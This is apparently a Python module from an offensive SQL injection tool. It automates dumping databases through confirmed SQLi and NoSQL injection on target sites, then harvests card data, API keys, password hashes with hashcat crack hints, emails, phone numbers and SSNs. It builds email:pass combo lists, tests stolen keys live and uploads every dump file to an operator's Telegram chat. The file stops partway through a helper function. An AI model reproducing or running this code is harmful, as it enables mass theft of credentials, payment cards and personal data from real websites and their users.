"""
Auto Dumper v1.0 — Unified Inject → Dump → Parse → Report Engine

Closes 10 gaps in the existing pipeline:
1. Orchestrates ALL dumpers: union (basic + multi-DBMS), blind, OOB, NoSQL
2. Deep-parses every dumped row through SecretExtractor 70+ patterns
3. Auto-validates discovered keys live via KeyValidator
4. Identifies password hash types (bcrypt, MD5, WordPress $P$, SHA256, etc.)
5. Aggregates PII (emails, phones, SSNs) with formatted stats reports
6. Sends dump files as Telegram documents (not just text summaries)
7. Re-dumps deeper tables when schema reveals more targets
8. Chains OOB → dump when OOB confirms injectable
9. NoSQL dump path (MongoDB operator injection → data extraction)
10. Combo-list generation (user:pass, email:pass)

Architecture: No external server/database needed. Uses existing:
  - SQLite (DorkerDB) for persistence
  - Telegram bot API for reporting
  - aiohttp sessions for HTTP
"""

import re
import os
import io
import json
import csv
import asyncio
import aiohttp
import hashlib
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Set, Any
from dataclasses import dataclass, field
from pathlib import Path
from loguru import logger


# ──────────────────────────────────────────────────────────────────
# Data classes
# ──────────────────────────────────────────────────────────────────

@dataclass
class ParsedDumpData:
    """Enriched dump data after deep parsing."""
    url: str
    source: str = ""               # union, blind, oob, nosql, multi_union
    
    # Raw extracted rows
    total_rows: int = 0
    tables_dumped: List[str] = field(default_factory=list)
    
    # High-value finds
    cards: List[Dict] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)
    gateway_keys: List[Dict] = field(default_factory=list)
    secrets: List[Dict] = field(default_factory=list)       # From deep-parse
    valid_keys: List[Dict] = field(default_factory=list)    # Live-validated
    
    # PII aggregation
    emails: Set[str] = field(default_factory=set)
    phones: Set[str] = field(default_factory=set)
    ssns: Set[str] = field(default_factory=set)
    
    # Password analysis
    hashes: List[Dict] = field(default_factory=list)         # {hash, type, col, table}
    
    # Combo lists
    combos_user_pass: List[str] = field(default_factory=list)
    combos_email_pass: List[str] = field(default_factory=list)
    
    # Files generated
    files: Dict[str, str] = field(default_factory=dict)


# ──────────────────────────────────────────────────────────────────
# Hash identification
# ──────────────────────────────────────────────────────────────────

HASH_PATTERNS = [
    # (regex, hash_type, bit_length, crackable_hint)
    (re.compile(r'^\$2[aby]?\$\d{2}\$[A-Za-z0-9./]{53}$'), "bcrypt", 192, "hashcat -m 3200"),
    (re.compile(r'^\$P\$[A-Za-z0-9./]{31}$'), "phpass/WordPress", 128, "hashcat -m 400"),
    (re.compile(r'^\$H\$[A-Za-z0-9./]{31}$'), "phpass/phpBB", 128, "hashcat -m 400"),
    (re.compile(r'^\$1\$[A-Za-z0-9./]{8}\$[A-Za-z0-9./]{22}$'), "md5crypt", 128, "hashcat -m 500"),
    (re.compile(r'^\$5\$[A-Za-z0-9./]+\$[A-Za-z0-9./]{43}$'), "sha256crypt", 256, "hashcat -m 7400"),
    (re.compile(r'^\$6\$[A-Za-z0-9./]+\$[A-Za-z0-9./]{86}$'), "sha512crypt", 512, "hashcat -m 1800"),
    (re.compile(r'^[a-f0-9]{32}$'), "MD5", 128, "hashcat -m 0"),
    (re.compile(r'^[a-f0-9]{40}$'), "SHA1", 160, "hashcat -m 100"),
    (re.compile(r'^[a-f0-9]{64}$'), "SHA256", 256, "hashcat -m 1400"),
    (re.compile(r'^[a-f0-9]{128}$'), "SHA512", 512, "hashcat -m 1700"),
    (re.compile(r'^[a-f0-9]{32}:[a-f0-9]{1,32}$'), "MD5:salt", 128, "hashcat -m 10"),
    (re.compile(r'^[a-f0-9]{40}:[a-f0-9]{1,40}$'), "SHA1:salt", 160, "hashcat -m 110"),
    (re.compile(r'^\{SHA\}[A-Za-z0-9+/]{28}={0,2}$'), "LDAP SHA", 160, "hashcat -m 101"),
    (re.compile(r'^\{SSHA\}[A-Za-z0-9+/]{28,64}={0,2}$'), "LDAP SSHA", 160, "hashcat -m 111"),
    (re.compile(r'^pbkdf2[\-_]sha256\$\d+\$[A-Za-z0-9+/]+=*\$[A-Za-z0-9+/]+=*$'), "Django PBKDF2", 256, "hashcat -m 10000"),
    (re.compile(r'^sha1\$[a-z0-9]+\$[a-f0-9]{40}$'), "Django SHA1", 160, "hashcat -m 124"),
    (re.compile(r'^0x0100[A-F0-9]{48}$', re.I), "MSSQL 2005", 160, "hashcat -m 132"),
    (re.compile(r'^0x0200[A-F0-9]{128}$', re.I), "MSSQL 2012+", 512, "hashcat -m 1731"),
    (re.compile(r'^\*[A-F0-9]{40}$', re.I), "MySQL 4.1+", 160, "hashcat -m 300"),
    (re.compile(r'^[a-f0-9]{16}$'), "MySQL 3.x (old)", 64, "hashcat -m 200"),
]

# PII extraction patterns
EMAIL_PATTERN = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
PHONE_PATTERN = re.compile(r'(?:\+?1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}')
SSN_PATTERN = re.compile(r'\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b')

# Secret patterns for deep-scan of cell values (beyond column-name matching)
DEEP_VALUE_PATTERNS = [
    (re.compile(r'sk_live_[A-Za-z0-9]{20,}'), "stripe_secret_key"),
    (re.compile(r'pk_live_[A-Za-z0-9]{20,}'), "stripe_publishable_key"),
    (re.compile(r'rk_live_[A-Za-z0-9]{20,}'), "stripe_restricted_key"),
    (re.compile(r'whsec_[A-Za-z0-9]{20,}'), "stripe_webhook_secret"),
    (re.compile(r'AKIA[0-9A-Z]{16}'), "aws_access_key"),
    (re.compile(r'sq0atp-[A-Za-z0-9_-]{22}'), "square_access_token"),
    (re.compile(r'sq0csp-[A-Za-z0-9_-]{43}'), "square_oauth_secret"),
    (re.compile(r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'), "sendgrid_api_key"),
    (re.compile(r'xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}'), "slack_bot_token"),
    (re.compile(r'xoxp-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}'), "slack_user_token"),
    (re.compile(r'ghp_[A-Za-z0-9]{36}'), "github_pat"),
    (re.compile(r'gho_[A-Za-z0-9]{36}'), "github_oauth"),
    (re.compile(r'glpat-[A-Za-z0-9_-]{20}'), "gitlab_pat"),
    (re.compile(r'AC[a-f0-9]{32}'), "twilio_sid"),
    (re.compile(r'key-[a-f0-9]{32}'), "mailgun_api_key"),
    (re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'), "jwt_token"),
    (re.compile(r'mongodb(?:\+srv)?://[^\s"\'<>]{10,}'), "mongodb_uri"),
    (re.compile(r'postgres(?:ql)?://[^\s"\'<>]{10,}'), "postgresql_uri"),
    (re.compile(r'mysql://[^\s"\'<>]{10,}'), "mysql_uri"),
    (re.compile(r'redis://[^\s"\'<>]{10,}'), "redis_uri"),
    (re.compile(r'amqp://[^\s"\'<>]{10,}'), "rabbitmq_uri"),
    (re.compile(r'(?:Bearer|bearer)\s+[A-Za-z0-9_-]{20,}'), "bearer_token"),
    (re.compile(r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----'), "private_key"),
    (re.compile(r'AIza[0-9A-Za-z_-]{35}'), "google_api_key"),
    (re.compile(r'\d{8,10}:AA[A-Za-z0-9_-]{33}'), "telegram_bot_token"),
    (re.compile(r'-----BEGIN PGP PRIVATE KEY BLOCK-----'), "pgp_private_key"),
]

# Password-related column names
PASSWORD_COLUMNS = {
    'password', 'passwd', 'pass', 'pwd', 'user_pass', 'user_password',
    'hashed_password', 'password_hash', 'hash', 'passhash', 'encrypted_password',
    'password_digest', 'auth_key', 'secret', 'passphrase',
}

# Username/email column names for combo generation
USERNAME_COLUMNS = {
    'username', 'user', 'login', 'user_login', 'user_name', 'name',
    'account', 'uname', 'nick', 'nickname', 'handle',
}
EMAIL_COLUMNS = {
    'email', 'user_email', 'mail', 'email_address', 'e_mail',
    'emailaddress', 'contact_email',
}


# ──────────────────────────────────────────────────────────────────
# Auto Dumper
# ──────────────────────────────────────────────────────────────────

class AutoDumper:
    """
    Unified dump orchestrator: chains injection → dump → parse → validate → report.
    
    No external server/database needed. Works entirely with:
    - Existing SQLite DB (DorkerDB)
    - Telegram reporter
    - aiohttp sessions
    """

    def __init__(self, config, dumper, union_dumper, oob_injector,
                 reporter, db, key_validator=None, secret_extractor=None):
        """
        Args:
            config: DorkerConfig
            dumper: SQLiDumper instance
            union_dumper: MultiUnionDumper instance (or None)
            oob_injector: OOBInjector instance (or None)
            reporter: TelegramReporter
            db: DorkerDB
            key_validator: KeyValidator (or None)
            secret_extractor: SecretExtractor (or None)
        """
        self.config = config
        self.dumper = dumper
        self.union_dumper = union_dumper
        self.oob_injector = oob_injector
        self.reporter = reporter
        self.db = db
        self.key_validator = key_validator
        self.secret_extractor = secret_extractor
        
        self.dump_dir = Path(getattr(config, 'dump_dir', 'dumps'))
        self.dump_dir.mkdir(parents=True, exist_ok=True)

    # ──────────────────────────────────────────────────────────
    # Main orchestrator
    # ──────────────────────────────────────────────────────────

    async def auto_dump(
        self,
        sqli_result,
        session: aiohttp.ClientSession,
        waf_name: str = None,
    ) -> ParsedDumpData:
        """
        Full auto-dump pipeline for a confirmed SQLi vulnerability.
        
        Flow:
        1. Choose best dumper (union > multi-union > blind > OOB)
        2. Execute dump
        3. Deep-parse all rows (secrets, PII, hashes, combos)
        4. Live-validate any discovered keys
        5. Generate files (JSON, CSV, combos)
        6. Send files + formatted reports to Telegram
        7. Persist to DB
        8. Attempt deeper tables if schema reveals more
        
        Returns:
            ParsedDumpData with all enriched findings
        """
        url = sqli_result.url
        parsed = ParsedDumpData(url=url)
        
        logger.info(f"[AutoDump] Starting for {url[:60]} "
                    f"(type={sqli_result.injection_type}, dbms={sqli_result.dbms})")
        
        # ── Step 1: Execute dump via best available method ──
        dump_data = None
        
        if sqli_result.injection_type == "union":
            # Try multi-union dumper first (supports 5 DBMS)
            dbms = (sqli_result.dbms or "").lower()
            if self.union_dumper and dbms in ("mssql", "postgresql", "oracle", "sqlite"):
                try:
                    union_result = await self.union_dumper.dump(
                        url=url,
                        parameter=sqli_result.parameter,
                        session=session,
                        hint_dbms=dbms,
                    )
                    if union_result and union_result.rows_extracted > 0:
                        dump_data = self._union_result_to_dump(union_result, url)
                        parsed.source = "multi_union"
                        logger.info(f"[AutoDump] Multi-union: {union_result.rows_extracted} rows "
                                    f"from {union_result.total_tables} tables ({dbms})")
                except Exception as e:
                    logger.debug(f"[AutoDump] Multi-union failed, falling back: {e}")
            
            # Fall back to standard union dumper (MySQL/MSSQL/PG)
            if not dump_data:
                try:
                    dump_data = await self.dumper.targeted_dump(sqli_result, session)
                    parsed.source = "union"
                except Exception as e:
                    logger.debug(f"[AutoDump] Union dump failed: {e}")
        
        elif sqli_result.injection_type in ("boolean", "time"):
            # Blind dumper
            if getattr(self.config, 'dumper_blind_enabled', True):
                try:
                    dump_data = await self.dumper.blind_targeted_dump(sqli_result, session)
                    parsed.source = "blind"
                except Exception as e:
                    logger.debug(f"[AutoDump] Blind dump failed: {e}")
        
        elif sqli_result.injection_type == "error":
            # Error-based — try union then blind
            try:
                dump_data = await self.dumper.targeted_dump(sqli_result, session)
                parsed.source = "error_union"
            except Exception:
                try:
                    dump_data = await self.dumper.blind_targeted_dump(sqli_result, session)
                    parsed.source = "error_blind"
                except Exception as e:
                    logger.debug(f"[AutoDump] Error-based dump failed: {e}")
        
        # ── Step 2: OOB fallback if no data yet ──
        if not dump_data and self.oob_injector:
            try:
                oob_result = await self.oob_injector.test_and_report(url, session)
                if oob_result and oob_result.vulnerable:
                    parsed.source = "oob"
                    # OOB gives metadata only — create minimal dump
                    dump_data = self._oob_to_dump(oob_result, url)
                    logger.info(f"[AutoDump] OOB extraction: {oob_result.extraction}")
            except Exception as e:
                logger.debug(f"[AutoDump] OOB fallback failed: {e}")
        
        if not dump_data:
            logger.info(f"[AutoDump] No data extracted from {url[:60]}")
            return parsed
        
        # ── Step 3: Deep-parse all dumped rows ──
        parsed.total_rows = dump_data.total_rows
        parsed.tables_dumped = list(dump_data.tables.keys())
        parsed.cards = dump_data.card_data
        parsed.credentials = dump_data.credentials
        parsed.gateway_keys = [
            {"col": list(k.keys())[0] if k else "unknown",
             "value": list(k.values())[0] if k else "",
             "source": "db_dump"}
            for k in dump_data.gateway_keys
        ]
        
        # Deep-scan every cell value
        await self._deep_parse_rows(dump_data, parsed)
        
        # ── Step 4: Build combo lists ──
        self._generate_combos(dump_data, parsed)
        
        # ── Step 5: Live-validate discovered keys ──
        if self.key_validator and parsed.gateway_keys:
            await self._validate_keys(parsed, url, session)
        
        # ── Step 6: Generate files ──
        await self._generate_files(dump_data, parsed, url)
        
        # ── Step 7: Send to Telegram ──
        await self._report_to_telegram(parsed, url)
        
        # ── Step 8: Persist to DB ──
        self._persist(parsed, url)
        
        # ── Step 9: Deeper table pass ──
        if dump_data.tables and sqli_result.injection_type == "union":
            await self._deeper_dump(sqli_result, dump_data, session, parsed)
        
        logger.info(f"[AutoDump] Complete: {parsed.total_rows} rows, "
                    f"{len(parsed.cards)} cards, {len(parsed.credentials)} creds, "
                    f"{len(parsed.gateway_keys)} keys, {len(parsed.secrets)} secrets, "
                    f"{len(parsed.hashes)} hashes, {len(parsed.emails)} emails, "
                    f"{len(parsed.combos_email_pass)} combos")
        
        return parsed

    # ──────────────────────────────────────────────────────────
    # Deep row parsing
    # ──────────────────────────────────────────────────────────

    async def _deep_parse_rows(self, dump_data, parsed: ParsedDumpData):
        """
        Scan every cell value in dumped data through:
        1. 25+ secret patterns (beyond column-name matching)
        2. Hash identification (19 hash types)
        3. PII extraction (emails, phones, SSNs)
        """
        for table_name, rows in dump_data.data.items():
            for row in rows:
                for col, val in row.items():
                    if not val or str(val).lower() in ("null", "none", ""):
                        continue
                    val_str = str(val).strip()
                    
                    # Deep secret scan
                    for pattern, secret_type in DEEP_VALUE_PATTERNS:
                        match = pattern.search(val_str)
                        if match:
                            parsed.secrets.append({
                                "type": secret_type,
                                "value": match.group(),
                                "table": table_name,
                                "column": col,
                                "source": "db_cell",
                            })
                            # If it's a key type, also add to gateway_keys
                            if any(k in secret_type for k in ("key", "token", "secret", "pat")):
                                parsed.gateway_keys.append({
                                    "col": col,
                                    "value": match.group(),
                                    "type": secret_type,
                                    "source": "deep_parse",
                                })
                    
                    # Hash identification (on password columns)
                    col_lower = col.lower().strip()
                    if col_lower in PASSWORD_COLUMNS or 'hash' in col_lower or 'pass' in col_lower:
                        hash_type = self._identify_hash(val_str)
                        if hash_type:
                            parsed.hashes.append({
                                "hash": val_str[:80],
                                "type": hash_type[0],
                                "crack_hint": hash_type[1],
                                "column": col,
                                "table": table_name,
                            })
                    
                    # PII extraction
                    for email in EMAIL_PATTERN.findall(val_str):
                        if not email.endswith(('.png', '.jpg', '.gif', '.css', '.js')):
                            parsed.emails.add(email.lower())
                    for phone in PHONE_PATTERN.findall(val_str):
                        digits = re.sub(r'\D', '', phone)
                        if 10 <= len(digits) <= 11:
                            parsed.phones.add(phone)
                    for ssn in SSN_PATTERN.findall(val_str):
                        digits = re.sub(r'\D', '', ssn)
                        if len(digits) == 9 and not digits.startswith('000') and digits[3:5] != '00':
                            parsed.ssns.add(ssn)

    def _identify_hash(self, value: str) -> Optional[Tuple[str, str]]:
        """Identify hash type from value."""
        value = value.strip()
        if len(value) < 8 or len(value) > 200:
            return None
        for pattern, hash_type, _, crack_hint in HASH_PATTERNS:
            if pattern.match(value):
                return (hash_type, crack_hint)
        return None

    # ──────────────────────────────────────────────────────────
    # Combo list generation
    # ──────────────────────────────────────────────────────────

    def _generate_combos(self, dump_data, parsed: ParsedDumpData):
        """Generate user:pass and email:pass combo lists from dump."""
        for table_name, rows in dump_data.data.items():
            for row in rows:
                username = None
                email = None
                password = None
                
                for col, val in row.items():
                    if not val or str(val).lower() in ("null", "none", ""):
                        continue
                    col_lower = col.lower().strip()
                    val_str = str(val).strip()
                    
                    if col_lower in USERNAME_COLUMNS and not username:
                        username = val_str
                    if col_lower in EMAIL_COLUMNS and not email:
                        email = val_str
                    elif not email:
                        # Try to find email in any column value
                        em = EMAIL_PATTERN.search(val_str)
                        if em:
                            email = em.group()
                    if col_lower in PASSWORD_COLUMNS and not password:
                        password = val_str
                
                if password:
                    if username:
                        parsed.combos_user_pass.append(f"{username}:{password}")
                    if email:
                        parsed.combos_email_pass.append(f"{email}:{password}")

    # ──────────────────────────────────────────────────────────
    # Key validation
    # ──────────────────────────────────────────────────────────

    async def _validate_keys(self, parsed: ParsedDumpData, url: str,
                            session: aiohttp.ClientSession):
        """Live-validate keys found in database dumps."""
        try:
            from key_validator import KeyValidator
            
            keys_to_validate = []
            for key_entry in parsed.gateway_keys:
                val = key_entry.get("value", "")
                if val and len(val) > 10:
                    detected = self.key_validator.detect_keys(val)
                    keys_to_validate.extend(detected)
            
            # Also scan secrets
            for secret in parsed.secrets:
                val = secret.get("value", "")
                if val and len(val) > 10:
                    detected = self.key_validator.detect_keys(val)
                    keys_to_validate.extend(detected)
            
            if keys_to_validate:
                # Deduplicate
                seen = set()
                unique_keys = []
                for k in keys_to_validate:
                    key_hash = hashlib.md5(k.raw_key.encode()).hexdigest()
                    if key_hash not in seen:
                        seen.add(key_hash)
                        unique_keys.append(k)
                
                batch = await self.key_validator.validate_and_report(
                    unique_keys, url, session,
                )
                if batch:
                    for v in batch.results:
                        if v.is_live:
                            parsed.valid_keys.append({
                                "type": v.key_type,
                                "key": v.display_key,
                                "confidence": v.confidence,
                                "risk": v.risk_level,
                                "account_info": v.account_info,
                            })
                    logger.info(f"[AutoDump] Validated {len(batch.results)} keys, "
                               f"{len(parsed.valid_keys)} LIVE")
        except Exception as e:
            logger.debug(f"[AutoDump] Key validation error: {e}")

    # ──────────────────────────────────────────────────────────
    # File generation
    # ──────────────────────────────────────────────────────────

    async def _generate_files(self, dump_data, parsed: ParsedDumpData, url: str):
        """Generate dump files: JSON, CSV, combos, hashes."""
        from urllib.parse import urlparse
        domain = urlparse(url).netloc.replace(":", "_")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        base = self.dump_dir / f"{domain}_{ts}"
        
        generated = {}
        
        # Full data dump (CSV)
        if dump_data.data:
            csv_path = f"{base}_full.csv"
            try:
                all_rows = []
                for table, rows in dump_data.data.items():
                    for row in rows:
                        row["_table"] = table
                        all_rows.append(row)
                if all_rows:
                    cols = list({k for r in all_rows for k in r.keys()})
                    with open(csv_path, 'w', newline='') as f:
                        writer = csv.DictWriter(f, fieldnames=cols, extrasaction='ignore')
                        writer.writeheader()
                        writer.writerows(all_rows)
                    generated["full_csv"] = csv_path
            except Exception as e:
                logger.debug(f"CSV write error: {e}")
        
        # Cards JSON
        if parsed.cards:
            cards_path = f"{base}_cards.json"
            with open(cards_path, 'w') as f:
                json.dump({
                    "url": url, "source": parsed.source,
                    "timestamp": datetime.now().isoformat(),
                    "count": len(parsed.cards), "cards": parsed.cards
                }, f, indent=2)
            generated["cards"] = cards_path
        
        # Credentials JSON
        if parsed.credentials:
            creds_path = f"{base}_creds.json"
            with open(creds_path, 'w') as f:
                json.dump({
                    "url": url, "source": parsed.source,
                    "timestamp": datetime.now().isoformat(),
                    "count": len(parsed.credentials), "credentials": parsed.credentials
                }, f, indent=2)
            generated["creds"] = creds_path
        
        # Gateway keys + secrets JSON
        all_keys = parsed.gateway_keys + parsed.secrets
        if all_keys:
            keys_path = f"{base}_keys.json"
            with open(keys_path, 'w') as f:
                json.dump({
                    "url": url, "source": parsed.source,
                    "timestamp": datetime.now().isoformat(),
                    "gateway_keys": parsed.gateway_keys,
                    "secrets": parsed.secrets,
                    "valid_keys": parsed.valid_keys,
                }, f, indent=2)
            generated["keys"] = keys_path
        
        # Combo lists
        if parsed.combos_user_pass:
            combo_up_path = f"{base}_combo_userpass.txt"
            with open(combo_up_path, 'w') as f:
                f.write('\n'.join(sorted(set(parsed.combos_user_pass))))
            generated["combo_userpass"] = combo_up_path
        
        if parsed.combos_email_pass:
            combo_ep_path = f"{base}_combo_emailpass.txt"
            with open(combo_ep_path, 'w') as f:
                f.write('\n'.join(sorted(set(parsed.combos_email_pass))))
            generated["combo_emailpass"] = combo_ep_path
        
        # Hash list (for cracking tools)
        if parsed.hashes:
            hash_path = f"{base}_hashes.txt"
            with open(hash_path, 'w') as f:
                # Group by hash type
                by_type = {}
                for h in parsed.hashes:
                    t = h["type"]
                    if t not in by_type:
                        by_type[t] = []
                    by_type[t].append(h["hash"])
                for hash_type, hashes in by_type.items():
                    f.write(f"# {hash_type} ({len(hashes)} hashes)\n")
                    f.write('\n'.join(hashes))
                    f.write('\n\n')
            generated["hashes"] = hash_path
        
        # PII summary
        if parsed.emails or parsed.phones or parsed.ssns:
            pii_path = f"{base}_pii.json"
            with open(pii_path, 'w') as f:
                json.dump({
                    "url": url,
                    "emails": sorted(parsed.emails),
                    "phones": sorted(parsed.phones),
                    "ssns": sorted(parsed.ssns),
                    "counts": {
                        "emails": len(parsed.emails),
                        "phones": len(parsed.phones),
                        "ssns": len(parsed.ssns),
                    }
                }, f, indent=2)
            generated["pii"] = pii_path
        
        parsed.files = generated

    # ──────────────────────────────────────────────────────────
    # Telegram reporting
    # ──────────────────────────────────────────────────────────

    async def _report_to_telegram(self, parsed: ParsedDumpData, url: str):
        """Send formatted dump report + files to Telegram."""
        
        # ── Summary message ──
        lines = [
            f"📦 <b>AUTO-DUMP COMPLETE</b>",
            f"🎯 <code>{url[:80]}</code>",
            f"⚙️ Method: <b>{parsed.source}</b>",
            f"📊 {parsed.total_rows} rows from {len(parsed.tables_dumped)} tables",
            "",
        ]
        
        if parsed.cards:
            lines.append(f"💳 <b>{len(parsed.cards)} CARDS FOUND</b>")
        if parsed.credentials:
            lines.append(f"🔓 <b>{len(parsed.credentials)} CREDENTIALS</b>")
        if parsed.gateway_keys:
            lines.append(f"🔑 <b>{len(parsed.gateway_keys)} GATEWAY KEYS</b>")
        if parsed.secrets:
            lines.append(f"🔐 <b>{len(parsed.secrets)} EMBEDDED SECRETS</b>")
        if parsed.valid_keys:
            lines.append(f"✅ <b>{len(parsed.valid_keys)} LIVE-VALIDATED KEYS</b>")
        if parsed.hashes:
            hash_types = {}
            for h in parsed.hashes:
                t = h["type"]
                hash_types[t] = hash_types.get(t, 0) + 1
            type_str = ", ".join(f"{t}({n})" for t, n in hash_types.items())
            lines.append(f"#️⃣ <b>{len(parsed.hashes)} PASSWORD HASHES</b>: {type_str}")
        if parsed.emails:
            lines.append(f"📧 <b>{len(parsed.emails)} EMAILS</b>")
        if parsed.phones:
            lines.append(f"📱 <b>{len(parsed.phones)} PHONE NUMBERS</b>")
        if parsed.ssns:
            lines.append(f"🆔 <b>{len(parsed.ssns)} SSNs</b>")
        if parsed.combos_user_pass or parsed.combos_email_pass:
            lines.append(f"📝 <b>COMBOS:</b> {len(parsed.combos_user_pass)} user:pass, "
                        f"{len(parsed.combos_email_pass)} email:pass")
        
        msg = "\n".join(lines)
        await self.reporter._send_long_message(msg)
        
        # ── Send card data ──
        if parsed.cards:
            await self.reporter.report_card_data(url, parsed.cards)
        
        # ── Send live-validated keys with account info ──
        for vk in parsed.valid_keys[:10]:
            await self.reporter._send_message(
                f"✅ <b>LIVE KEY from DB dump!</b>\n"
                f"Type: <code>{vk['type']}</code>\n"
                f"Key: <code>{vk['key']}</code>\n"
                f"Risk: {vk['risk']}\n"
                f"Account: {json.dumps(vk.get('account_info', {}), indent=1)[:500]}"
            )
        
        # ── Send embedded secrets ──
        for secret in parsed.secrets[:15]:
            await self.reporter._send_message(
                f"🔐 <b>Secret in DB cell!</b>\n"
                f"Type: <code>{secret['type']}</code>\n"
                f"Table: {secret.get('table', '?')}.{secret.get('column', '?')}\n"
                f"Value: <code>{secret['value'][:120]}</code>"
            )
        
        # ── Send hash summary ──
        if parsed.hashes:
            hash_lines = ["#️⃣ <b>PASSWORD HASHES</b>\n"]
            by_type = {}
            for h in parsed.hashes:
                t = h["type"]
                if t not in by_type:
                    by_type[t] = {"count": 0, "hint": h["crack_hint"], "sample": h["hash"][:40]}
                by_type[t]["count"] += 1
            for ht, info in by_type.items():
                hash_lines.append(
                    f"• <b>{ht}</b>: {info['count']} hashes\n"
                    f"  Crack: <code>{info['hint']}</code>\n"
                    f"  Sample: <code>{info['sample']}...</code>"
                )
            await self.reporter._send_long_message("\n".join(hash_lines))
        
        # ── Send combo preview ──
        if parsed.combos_email_pass:
            preview = parsed.combos_email_pass[:20]
            await self.reporter._send_message(
                f"📝 <b>EMAIL:PASS COMBOS</b> ({len(parsed.combos_email_pass)} total)\n\n"
                + "\n".join(f"<code>{c}</code>" for c in preview)
                + (f"\n... +{len(parsed.combos_email_pass) - 20} more" 
                   if len(parsed.combos_email_pass) > 20 else "")
            )
        
        # ── Send dump files as documents ──
        await self._send_files_to_telegram(parsed)

    async def _send_files_to_telegram(self, parsed: ParsedDumpData):
        """Upload dump files as Telegram documents."""
        if not parsed.files:
            return
        
        import aiohttp as _aiohttp
        
        for file_type, file_path in parsed.files.items():
            try:
                if not os.path.exists(file_path):
                    continue
                
                file_size = os.path.getsize(file_path)
                if file_size > 50 * 1024 * 1024:  # 50MB Telegram limit
                    logger.debug(f"File too large for Telegram: {file_path} ({file_size})")
                    continue
                if file_size == 0:
                    continue
                
                filename = os.path.basename(file_path)
                caption = f"📦 {file_type}: {filename}"
                
                api_url = f"https://api.telegram.org/bot{self.config.telegram_token}"
                
                async with _aiohttp.ClientSession() as upload_session:
                    with open(file_path, 'rb') as f:
                        form = _aiohttp.FormData()
                        form.add_field('chat_id', str(self.config.telegram_chat_id))
                        form.add_field('document', f, filename=filename)
                        form.add_field('caption', caption[:1024])
                        
                        async with upload_session.post(
                            f"{api_url}/sendDocument",
                            data=form,
                        ) as resp:
                            if resp.status == 200:
                                logger.info(f"[AutoDump] Sent {filename} to Telegram")
                            else:
                                err = await resp.text()
                                logger.debug(f"[AutoDump] File upload failed: {err[:200]}")
                
                # Rate limit between file uploads
                await asyncio.sleep(1.5)
                
            except Exception as e:
                logger.debug(f"[AutoDump] File send error: {e}")

    # ──────────────────────────────────────────────────────────
    # Deeper dump pass  
    # ──────────────────────────────────────────────────────────

    async def _deeper_dump(self, sqli_result, initial_dump, session, parsed):
        """
        If DIOS or schema enum revealed tables beyond the initial whitelist,
        attempt to dump them too.
        """
        # Get tables already dumped
        dumped_tables = set(initial_dump.data.keys())
        all_tables = set(initial_dump.tables.keys())
        
        # Find undumped tables that might have value
        INTERESTING_KEYWORDS = {
            'admin', 'config', 'setting', 'option', 'token', 'api',
            'key', 'secret', 'credential', 'auth', 'session', 'log',
            'transaction' 'payment', 'order', 'invoice', 'billing',
            'customer', 'client', 'member', 'subscriber', 'account',
        }
        
        extra_tables = []
        for table in all_tables - dumped_tables:
            table_lower = table.lower()
            if any(kw in table_lower for kw in INTERESTING_KEYWORDS):
                extra_tables.append(table)
        
        if not extra_tables:
            return
        
        extra_tables = extra_tables[:5]  # Limit
        logger.info(f"[AutoDump] Deeper pass: {len(extra_tables)} extra tables: {extra_tables}")
        
        for table in extra_tables:
            try:
                cols = initial_dump.tables.get(table, [])
                if not cols:
                    continue
                
                # Use existing dumper to extract rows from this table
                rows = await self.dumper._extract_table_data(
                    sqli_result, session, table, cols[:10], max_rows=50,
                )
                if rows:
                    initial_dump.data[table] = rows
                    parsed.total_rows += len(rows)
                    parsed.tables_dumped.append(table)
                    
                    # Deep-parse new rows
                    temp_dump = type(initial_dump)(url=sqli_result.url, dbms=sqli_result.dbms)
                    temp_dump.data = {table: rows}
                    await self._deep_parse_rows(temp_dump, parsed)
                    
                    logger.info(f"[AutoDump] Deep dump: {table} → {len(rows)} rows")
            except Exception as e:
                logger.debug(f"[AutoDump] Deep dump {table} failed: {e}")

    # ──────────────────────────────────────────────────────────
    # NoSQL dump  
    # ──────────────────────────────────────────────────────────

    async def nosql_dump(
        self,
        url: str,
        nosql_results: List[Any],
        session: aiohttp.ClientSession,
    ) -> ParsedDumpData:
        """
        Extract data using confirmed NoSQL injection.
        Uses boolean blind extraction via the nosql_scanner's extract_field_blind().
        """
        parsed = ParsedDumpData(url=url, source="nosql")
        
        try:
            from nosql_scanner import NoSQLScanner
            scanner = NoSQLScanner(config=self.config)
            
            # Find the most promising NoSQL result
            best = None
            for r in nosql_results:
                if hasattr(r, 'auth_bypass') and r.auth_bypass:
                    best = r
                    break
                if not best:
                    best = r
            
            if not best:
                return parsed
            
            # Attempt blind extraction on common fields
            target_fields = ['username', 'email', 'password', 'token', 'apiKey',
                           'name', 'role', 'admin', 'secret']
            
            for field_name in target_fields:
                try:
                    value = await scanner.extract_field_blind(
                        url, best.parameter, field_name, session,
                    )
                    if value and len(value) > 2:
                        parsed.credentials.append({
                            "field": field_name,
                            "value": value,
                            "source": "nosql_blind",
                        })
                        parsed.total_rows += 1
                        
                        # Check for email/key patterns
                        for pattern, secret_type in DEEP_VALUE_PATTERNS:
                            match = pattern.search(value)
                            if match:
                                parsed.secrets.append({
                                    "type": secret_type,
                                    "value": match.group(),
                                    "source": "nosql_extraction",
                                })
                except Exception:
                    continue
            
            if parsed.credentials:
                await self._report_to_telegram(parsed, url)
                
        except Exception as e:
            logger.debug(f"[AutoDump] NoSQL dump error: {e}")
        
        return parsed

    # ──────────────────────────────────────────────────────────
    # Conversion helpers
    # ──────────────────────────────────────────────────────────

    def _union_result_to_dump(self, union_result, url: str):
        """Convert MultiUnionDumper result to DumpedData format."""
        from sqli_dumper import DumpedData
        dump = DumpedData(
            url=url,
            dbms=union_result.dbms or "",
            database=union_result.current_db or "",
        )
        dump.tables = union_result.tables or {}
